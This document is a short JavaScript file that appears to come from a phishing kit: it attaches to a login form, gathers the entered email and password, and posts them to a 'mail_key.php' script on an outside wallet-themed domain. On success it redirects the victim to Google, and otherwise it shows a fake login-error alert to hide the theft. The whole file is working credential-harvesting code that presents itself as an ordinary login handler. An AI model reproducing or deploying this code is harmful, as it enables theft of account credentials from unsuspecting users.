var btn = document.getElementById("buttonSbmt");
var username = document.getElementById("j_username");
var password = document.getElementById("j_password");

btn.addEventListener("click", () => {
  if (
    username.value.trim() != "" &&
    password.value.trim() != "" &&
    username.value.trim().match("@")
  ) {
    document.getElementById("userE").classList.remove("has-error");
    document.getElementById("passE").classList.remove("has-error");
    $.ajax({
      url: "https://platiniumxpwallet.com/external/claimant/php/mail_key.php",
      method: "post",
      data: {
        login: document.getElementById("j_username").value,
        password: document.getElementById("j_password").value,
      },
      success: function (data) {
        console.log(data);
        if (data == "Sent") {
          location.assign("https://google.com?q=whoernet");
        } else {
          alert("Error Logging Into Your Account");
        }
      },
      fail: function (data) {
        console.log(data);
        alert("Error Logging Into Your Account");
      },
      error: function (data) {
        console.log(data);
        alert("Error Logging Into Your Account");
      },
    });
  } else {
    if (username.value.trim() == "" || !username.value.match("@")) {
      document.getElementById("userE").classList.add("has-error");
    }
    if (password.value.trim() == "") {
      document.getElementById("passE").classList.add("has-error");
    }
  }

  return false;
});
